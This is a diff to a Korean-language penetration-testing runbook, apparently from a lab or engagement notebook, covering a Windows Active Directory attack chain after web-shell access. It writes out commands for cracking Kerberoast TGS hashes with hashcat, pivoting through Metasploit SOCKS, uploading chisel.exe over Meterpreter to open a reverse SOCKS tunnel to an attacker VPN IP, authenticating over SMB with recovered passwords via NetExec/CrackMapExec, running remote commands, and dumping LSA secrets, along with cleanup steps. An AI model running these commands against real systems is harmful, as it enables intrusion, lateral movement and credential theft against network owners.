@@ -152,7 +152,8 @@ Get-DomainUser -Identity '<SPN_USER>' | Get-DomainSPNTicket -Format Hashcat
 TGS hash를 Linux 분석 호스트로 옮긴 뒤 실제 etype에 맞는 mode로 크래킹한다. 다음 예시는 etype 23일 때만 사용한다.
 
 ```bash
-hashcat -m 13100 kerberoast.hashes <WORDLIST> --backend-ignore-opencl -d 1 -O -w 3
+test ! -e '<KERBEROAST_POTFILE>'
+hashcat -m 13100 '<KERBEROAST_HASH_FILE>' '<WORDLIST>' --potfile-path '<KERBEROAST_POTFILE>' --restore-disable --backend-ignore-opencl -d 1 -O -w 3
 ```
 
 `$krb5tgs$` hash 수집, 평문 후보 복구, 해당 비밀번호의 현재 서비스 인증 성공은 서로 다른 상태다. 비밀번호가 복구되면 계정 잠금 정책을 확인하고 후속 인증 시도 범위를 정한다.
@@ -243,10 +244,11 @@ msf6 > jobs -l
 
 `show options`에서 현재 기본값이 `SRVHOST 0.0.0.0`, `SRVPORT 1080`, `VERSION 5`이면 별도 설정 없이 job을 실행한다. `0.0.0.0`으로 수신해도 같은 공격 호스트의 ProxyChains는 `127.0.0.1:1080`으로 연결할 수 있다. 다른 인터페이스에서 SOCKS 연결을 받을 필요가 없을 때만 `set SRVHOST 127.0.0.1`로 제한한다.
 
-전역 `/etc/proxychains.conf`를 바꾸지 않고 Linux 공격 호스트의 현재 디렉터리에 이 경로 전용 `meterpreter-socks.conf` 파일을 만든다. 파일명은 임의로 정할 수 있지만 아래 `-f` 인수와 같아야 한다.
+전역 `/etc/proxychains.conf`를 바꾸지 않고 Linux 공격 호스트에 기존에 없던 `<METERPRETER_PROXYCHAINS_CONFIG>` 파일을 만든다. exact 경로는 아래 `-f` 인수와 같아야 한다.
 
 ```bash
-cat > ./meterpreter-socks.conf <<'EOF'
+test ! -e '<METERPRETER_PROXYCHAINS_CONFIG>'
+cat > '<METERPRETER_PROXYCHAINS_CONFIG>' <<'EOF'
 strict_chain
 proxy_dns
 
@@ -254,7 +256,7 @@ proxy_dns
 socks5 127.0.0.1 1080
 EOF
 
-sed -n '1,20p' ./meterpreter-socks.conf
+sed -n '1,20p' '<METERPRETER_PROXYCHAINS_CONFIG>'
 ```
 
 `sed` 출력의 SOCKS 버전·주소·포트가 Metasploit `socks_proxy`의 `VERSION 5`, `SRVPORT 1080`과 일치하는지 확인한다. Metasploit이 `SRVHOST 0.0.0.0`으로 수신 중이면 로컬 클라이언트의 `127.0.0.1:1080` 연결을 포함하므로 두 주소가 문자열 그대로 같을 필요는 없다.
@@ -282,22 +284,30 @@ ProxyChains의 첫 TCP 연결은 `OK`지만 같은 명령의 다음 연결이 ti
 Linux 공격 호스트에서 reverse tunnel server를 먼저 실행한다.
 
 ```bash
-./chisel server --reverse -p <CHISEL_SERVER_PORT>
+./chisel server --reverse -p <CHISEL_SERVER_PORT> &
+CHISEL_SERVER_PID=$!
+ps -p "$CHISEL_SERVER_PID" -o pid,cmd
 ```
 
-새 Windows Meterpreter 세션으로 Windows x64용 `chisel.exe`를 전송하고 reverse SOCKS client를 실행한다.
+새 Windows Meterpreter 세션에서 `<CHISEL_CLIENT_PATH>`가 기존에 없는 경로인지 확인한 뒤 Windows x64용 `chisel.exe`를 전송하고 reverse SOCKS client를 실행한다. `execute`가 출력한 process ID를 `<CHISEL_CLIENT_PID>`로 기록한다.
 
 ```text
-meterpreter > upload <KALI_WINDOWS_AMD64_CHISEL> C:\\Windows\\Temp\\chisel.exe
-meterpreter > execute -f C:\\Windows\\Temp\\chisel.exe -a "client <ATTACKER_VPN_IP>:<CHISEL_SERVER_PORT> R:1083:socks" -H
+meterpreter > shell
+C:\> powershell -NoProfile -Command "Test-Path -LiteralPath '<CHISEL_CLIENT_PATH>'"
+C:\> exit
+meterpreter > upload <KALI_WINDOWS_AMD64_CHISEL> <CHISEL_CLIENT_PATH>
+meterpreter > execute -f <CHISEL_CLIENT_PATH> -a "client <ATTACKER_VPN_IP>:<CHISEL_SERVER_PORT> R:1083:socks" -H
 ```
+
+`Test-Path`가 `False`여야 한다. `True`이면 기존 파일을 덮어쓰지 않고 다른 `<CHISEL_CLIENT_PATH>`를 정한다.
 
 Linux 공격 호스트에서 Chisel server의 client 연결 로그와 `1083/TCP` listener를 확인한 뒤 전용 설정 파일을 만든다.
 
 ```bash
 ss -ltnp 'sport = :1083'
 
-cat > ./chisel-socks.conf <<'EOF'
+test ! -e '<CHISEL_PROXYCHAINS_CONFIG>'
+cat > '<CHISEL_PROXYCHAINS_CONFIG>' <<'EOF'
 strict_chain
 proxy_dns
 
@@ -305,7 +315,7 @@ proxy_dns
 socks5 127.0.0.1 1083
 EOF
 
-proxychains -f ./chisel-socks.conf nc -vz <SMB_CANDIDATE> 445
+proxychains -f '<CHISEL_PROXYCHAINS_CONFIG>' nc -vz <SMB_CANDIDATE> 445
 ```
 
 `ss`에는 `chisel`이 `127.0.0.1:1083`에서 수신 중이어야 하고, `nc`는 ProxyChains `OK`와 대상 `445/TCP` 연결 성공을 함께 반환해야 한다. 이 경로는 Metasploit `autoroute`와 `socks_proxy`를 사용하지 않는다.
@@ -317,27 +327,27 @@ SPN의 서비스 호스트와 일치하는 SMB 후보부터 복구한 계정으�
 현재 권장 도구인 NetExec을 사용할 때:
 
 ```bash
-proxychains -f ./meterpreter-socks.conf nxc smb <SQL_HOST_IP> -d <DOMAIN> -u <SPN_USER> -p '<RECOVERED_PASSWORD>'
-proxychains -f ./meterpreter-socks.conf nxc smb <NEXT_SMB_CANDIDATE> -d <DOMAIN> -u <SPN_USER> -p '<RECOVERED_PASSWORD>'
+proxychains -f '<METERPRETER_PROXYCHAINS_CONFIG>' nxc smb <SQL_HOST_IP> -d <DOMAIN> -u <SPN_USER> -p '<RECOVERED_PASSWORD>'
+proxychains -f '<METERPRETER_PROXYCHAINS_CONFIG>' nxc smb <NEXT_SMB_CANDIDATE> -d <DOMAIN> -u <SPN_USER> -p '<RECOVERED_PASSWORD>'
 ```
 
 NetExec의 각 행에서 IP 옆에 표시되는 hostname을 앞의 PTR·NetBIOS·AD 결과에 추가한다. 도메인 계정의 `[+]` 인증은 해당 계정이 그 호스트에서 관리자라는 뜻이 아니다. `Pwn3d!` 또는 admin 표시가 나온 IP만 `<INTERNAL_TARGET>`으로 선택하고 실제 명령 실행으로 확인한다.
 
 ```bash
-proxychains -f ./meterpreter-socks.conf nxc smb <INTERNAL_TARGET> -d <DOMAIN> -u <SPN_USER> -p '<RECOVERED_PASSWORD>' -x 'whoami /all'
+proxychains -f '<METERPRETER_PROXYCHAINS_CONFIG>' nxc smb <INTERNAL_TARGET> -d <DOMAIN> -u <SPN_USER> -p '<RECOVERED_PASSWORD>' -x 'whoami /all'
 ```
 
 기존 CrackMapExec 환경을 재현할 때도 같은 순서로 후보를 하나씩 확인한다.
 
 ```bash
-proxychains -f ./meterpreter-socks.conf crackmapexec smb <SMB_CANDIDATE> -d <DOMAIN> -u <SPN_USER> -p '<RECOVERED_PASSWORD>'
-proxychains -f ./meterpreter-socks.conf crackmapexec smb <INTERNAL_TARGET> -d <DOMAIN> -u <SPN_USER> -p '<RECOVERED_PASSWORD>' -x 'whoami /all'
+proxychains -f '<METERPRETER_PROXYCHAINS_CONFIG>' crackmapexec smb <SMB_CANDIDATE> -d <DOMAIN> -u <SPN_USER> -p '<RECOVERED_PASSWORD>'
+proxychains -f '<METERPRETER_PROXYCHAINS_CONFIG>' crackmapexec smb <INTERNAL_TARGET> -d <DOMAIN> -u <SPN_USER> -p '<RECOVERED_PASSWORD>' -x 'whoami /all'
 ```
 
 Chisel 경로로 전환했고 `Pwn3d!` 또는 원격 `whoami /all`로 `<SPN_USER>`의 관리자급 원격 작업 권한을 확인했으면, 같은 대상에서 LSA secret과 캐시된 도메인 로그온 정보를 수집한다. 단순한 SMB `[+]` 인증 성공만으로 `--lsa`를 실행하지 않는다.
 
 ```bash
-proxychains -f ./chisel-socks.conf crackmapexec smb <INTERNAL_TARGET> -d <DOMAIN> -u <SPN_USER> -p '<RECOVERED_PASSWORD>' --lsa
+proxychains -f '<CHISEL_PROXYCHAINS_CONFIG>' crackmapexec smb <INTERNAL_TARGET> -d <DOMAIN> -u <SPN_USER> -p '<RECOVERED_PASSWORD>' --lsa
 ```
 
 `Dumping LSA Secrets`, 서비스 계정 secret, `DPAPI_SYSTEM` 또는 cached domain logon 출력은 각각 [[Windows LSA Secrets 추출]]과 [[Windows Cached Domain Credentials 추출]]에서 해석한다. 출력된 값은 다른 호스트의 로그인 성공이나 관리자 권한을 보장하지 않으므로 계정·대상 서비스를 식별한 뒤 별도로 검증한다.
@@ -372,7 +382,7 @@ proxychains -f ./chisel-socks.conf crackmapexec smb <INTERNAL_TARGET> -d <DOMAIN
 | TCP scanner 결과 없음 | 잘못된 CIDR·route·방화벽·포트 선택 | 피벗 호스트에서 단일 대상 포트 확인 | 5단계 |
 | SOCKS job은 있으나 ProxyChains 실패 | VERSION·주소·포트 불일치 | `show options`, `jobs -l`, config의 ProxyList | 6단계 |
 | 첫 단일 ProxyChains 요청이 socket timeout | SOCKS listener 이후 Meterpreter가 목표 연결을 만들지 못함 | 추가 요청을 중단하고 `getuid`, `sessions -l`, `route print`, `jobs -l` 확인 | 설정 오류를 한 번 교정한 뒤 반복되면 Chisel 전환 |
-| ProxyChains timeout 뒤 `getuid`도 timeout | Meterpreter transport의 명령·피벗 채널이 함께 응답하지 않음 | 외부 요청을 더 만들지 않고 새 세션 확보 | 새 세션에서 Chisel 전송·실행 후 `chisel-socks.conf` 사용 |
+| ProxyChains timeout 뒤 `getuid`도 timeout | Meterpreter transport의 명령·피벗 채널이 함께 응답하지 않음 | 외부 요청을 더 만들지 않고 새 세션 확보 | 새 세션에서 Chisel 전송·실행 후 `<CHISEL_PROXYCHAINS_CONFIG>` 사용 |
 | SMB 인증 성공 후 `-x` 실패 | 관리자 권한·원격 실행 방식·RPC 경로 부족 | `Pwn3d!`, 135·445와 도구의 exec method | 다른 원격 서비스·실행 방식 검토 |
 | `--lsa`가 access denied 또는 dump 오류 반환 | SMB 인증은 성공했지만 원격 관리자급 작업 권한 또는 Remote Registry·hive 접근이 부족함 | `Pwn3d!`, `whoami /all`, 첫 dump 오류 | 인증 자료를 바꾸지 말고 대상 권한과 원격 작업 조건 재확인 |
 
@@ -382,13 +392,24 @@ proxychains -f ./chisel-socks.conf crackmapexec smb <INTERNAL_TARGET> -d <DOMAIN
 |---|---|---|---|
 | Metasploit 내부 route | CIDR, netmask, session ID | 해당 내부 대역 트래픽이 피벗 세션으로 전달됨 | `route remove <INTERNAL_SUBNET> <NETMASK> <SESSION_ID>` |
 | Metasploit SOCKS job | job ID, VERSION, SRVPORT | 공격 호스트에 SOCKS listener 유지 | `jobs -k <SOCKS_JOB_ID>` |
-| 공격 호스트의 `meterpreter-socks.conf` | 생성한 경로와 파일명 | 이 경로 전용 ProxyChains 설정 파일이 남음 | `rm -f ./meterpreter-socks.conf` |
-| 공격 호스트의 Chisel server와 `chisel-socks.conf` | server PID, 수신 포트, 설정 파일 경로 | reverse tunnel listener와 ProxyChains 설정 파일이 남음 | Chisel server 종료 후 `rm -f ./chisel-socks.conf` |
-| Windows 피벗 호스트의 `chisel.exe`와 client process | 파일 경로와 PID | reverse SOCKS client와 실행 파일이 남음 | 해당 PID 종료 후 `del C:\\Windows\\Temp\\chisel.exe` |
+| 공격 호스트의 Metasploit ProxyChains 설정 | 기존에 없던 `<METERPRETER_PROXYCHAINS_CONFIG>` exact 경로 | 이 경로 전용 ProxyChains 설정 파일이 남음 | `rm -- '<METERPRETER_PROXYCHAINS_CONFIG>'` |
+| 공격 호스트의 Chisel server와 설정 파일 | `<CHISEL_SERVER_PID>`, 수신 포트, 기존에 없던 `<CHISEL_PROXYCHAINS_CONFIG>` | reverse tunnel listener와 ProxyChains 설정 파일이 남음 | `kill <CHISEL_SERVER_PID>` 후 `rm -- '<CHISEL_PROXYCHAINS_CONFIG>'` |
+| Windows 피벗 호스트의 `chisel.exe`와 client process | `<CHISEL_CLIENT_PATH>`와 `<CHISEL_CLIENT_PID>` | reverse SOCKS client와 실행 파일이 남음 | `Stop-Process -Id <CHISEL_CLIENT_PID>` 후 `Remove-Item -LiteralPath '<CHISEL_CLIENT_PATH>' -Force` |
 | Windows 대상의 PowerView 파일 | 저장 경로와 hash | 대상 디스크에 스크립트 파일 생성 | `Remove-Item -LiteralPath '<POWERVIEW_PATH>' -Force` |
-| 공격 호스트 HTTP 서버 | PID와 bind 포트 | 파일 제공 listener 유지 | HTTP 서버 프로세스 종료 |
+| Kerberoast hash와 전용 potfile | Windows·Linux의 `<KERBEROAST_HASH_FILE>` exact 경로와 Linux `<KERBEROAST_POTFILE>` | TGS hash·복구 비밀번호가 로컬 파일에 남음 | 승인된 결과 인계 후 각 생성 호스트에서 exact hash 파일을 제거하고 Linux에서 `rm -- '<KERBEROAST_POTFILE>'` |
+| 공격 호스트 HTTP 서버 | `<HTTP_SERVER_PID>`와 bind 포트 | 파일 제공 listener 유지 | `kill <HTTP_SERVER_PID>` 후 `ps -p <HTTP_SERVER_PID>`에 process가 없는지 확인 |
+| Web Delivery와 reverse handler job | `jobs -l`의 `<WEB_DELIVERY_JOB_ID>`와 listener 포트 | stage listener와 handler가 남음 | 종속 session 종료 뒤 `jobs -k <WEB_DELIVERY_JOB_ID>` |
+| Meterpreter session | `sessions -l`의 `<SESSION_ID>`와 대상 PID | 대상의 session process와 공격 호스트 연결이 남음 | 원격 파일·Chisel client 정리 뒤 `sessions -k <SESSION_ID>` |
+| WMI 원격 shell과 임시 출력 | 사용한 계정·대상·client PID, 중단된 명령 여부 | 원격 shell 또는 명령 출력 임시 파일이 남을 수 있음 | shell에서 `exit`; 중단됐다면 [[WMI 원격 명령 실행]]의 exact 원격 출력 확인이 끝날 때까지 복구 미확인으로 유지 |
+| LSA 원격 추출의 임시 hive와 Remote Registry | 실행 전 service status·start type, `ADMIN$\Temp`의 8자 `.tmp` 목록 | wrapper 또는 secretsdump가 원격 임시 hive를 만들고 service를 일시 변경할 수 있음 | 피벗을 닫기 전에 [[Windows LSA Secrets 추출]]의 버전별 생성 자원과 기준선을 대조하고 exact 임시 파일·service 상태를 복구 |
+
+Metasploit 경로에서는 WMI·SMB client, 선택한 LSA 추출의 원격 임시 자원과 Windows 원격 파일을 먼저 정리하고, SOCKS job → 해당 route → Meterpreter session → Web Delivery job 순서로 종료한다. Chisel 전환 경로에서는 WMI·SMB client와 LSA 임시 자원 → Windows Chisel client와 원격 파일 → Linux Chisel server와 설정 파일 → HTTP server 순서로 정리한다. 하위 호스트에 필요한 정리가 남아 있는 동안 Meterpreter나 Chisel 연결을 먼저 끊지 않는다.
+
+각 명령 뒤에는 `sessions -l`, `jobs -l`, `route print`, `ss -lntp`, `Get-Process -Id <CHISEL_CLIENT_PID>`와 `Test-Path -LiteralPath '<POWERVIEW_PATH>'` 중 해당 경로의 상태를 실행 전 기준과 대조한다. 원격 연결이 이미 끊겨 파일, LSA 임시 hive·Remote Registry 또는 WMI 임시 출력을 확인할 수 없으면 완료가 아니라 `원격 복구 미확인`으로 기록한다.
 
 ## 완료 기준
+
+### 공격 목표
 
 - Windows Web Shell에서 시작한 Meterpreter 세션의 대상·사용자·아키텍처와 이동 뒤 생존 상태가 확인됨.
 - 알려진 SPN과 소유 계정을 같은 PowerView 객체에서 확인하고 TGS hash·복구 비밀번호 상태를 분리함.
@@ -399,6 +420,12 @@ proxychains -f ./chisel-socks.conf crackmapexec smb <INTERNAL_TARGET> -d <DOMAIN
 - LSA 수집을 선택했다면 서비스 secret·`DPAPI_SYSTEM`·cached domain logon을 서로 구분하고 후속 검증 경로를 연결함.
 - LSA에서 평문 AD 자격 증명을 얻었다면 대상 계정 SID의 복제 권한을 확인하고, 두 필수 권한이 모두 있을 때만 DCSync 요청자로 선택함.
 - 최종 원격 명령 실행 뒤에는 [[Windows 셸 또는 세션 확보 후 컨텍스트 열거]]에서 대상 호스트의 실제 계정·권한·네트워크 위치를 다시 확인함.
+
+### 복구 상태
+
+- 사용한 분기의 원격 파일·client를 상위 연결보다 먼저 정리하고, 기록한 PID·job·session·route·경로만 제거했는지 확인함.
+- Kerberoast hash·potfile과 ProxyChains 설정 파일의 처분 상태를 확인하고, 기존 파일을 이름만으로 일괄 삭제하지 않음.
+- 공격 목표 달성과 복구 완료를 별도로 판정함. LSA 분기의 Remote Registry·임시 hive 또는 WMI 임시 출력 확인이 끝나지 않았거나 연결이 먼저 끊겼으면 전체 원상복구로 기록하지 않음.
 
 ## 관련 노트
 
